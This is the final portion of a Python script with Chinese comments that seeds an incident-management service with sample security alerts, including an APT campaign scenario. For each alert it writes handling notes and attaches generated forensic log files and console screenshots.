    incident_service.init_db()

    # 构造待生成清单：(显示分组, 设备类型, 告警字典)
    groups = []
    for category, items in CATEGORY_DATA.items():
        if not only or category in only:
            groups.append((category.upper(), category, items))
    if not only or "apt" in only:
        groups.append(("APT 剧本·夜莺行动", None, APT_CAMPAIGN))

    total = sum(len(items) for _, _, items in groups)
    print(f"开始生成 {total} 条告警...\n")
    n = 0
    for group_label, fixed_cat, items in groups:
        print(f"—— {group_label} ({len(items)} 条) ——")
        for a in items:
            category = fixed_cat or a.get("source_category", "other")
            a = dict(a, source_category=category)
            actor = a.get("reporter", "operator")
            alert = incident_service.create_alert(a, actor=actor)
            aid = alert["id"]
            n += 1
            tag = a.get("conclusion", "")
            print(f"  [{n}/{total}] {a['severity'].upper():8} {('['+tag+'] ') if tag else ''}{a['title']}")

            incident_service.add_note(
                aid,
                f"自动导入：{a.get('source_system')} 触发 {a.get('rule_id')}（{a.get('mitre','-')}）。{a.get('handling_suggestion','')}",
                "manual", actor,
            )
            tok = (a.get("hostname") or a.get("source_ip") or "evt").replace("\\", "_").replace("/", "_").replace(" ", "")
            attach(aid, f"{category}_{tok}_{a['rule_id']}.log", render_log(category, a),
                   "text/plain", f"{a.get('source_system')} 取证日志", actor)
            if not args.no_image and HAS_PIL:
                attach(aid, f"{category}_console_{a['rule_id']}.png", render_screenshot(category, a),
                       "image/png", f"{a.get('source_system')} 告警详情截图", actor)

    print(f"\n完成：共创建 {n} 条告警（含取证日志{'与截图' if (HAS_PIL and not args.no_image) else ''}）。")
    print("打开 http://localhost:5000 查看。")


if __name__ == "__main__":
    main()
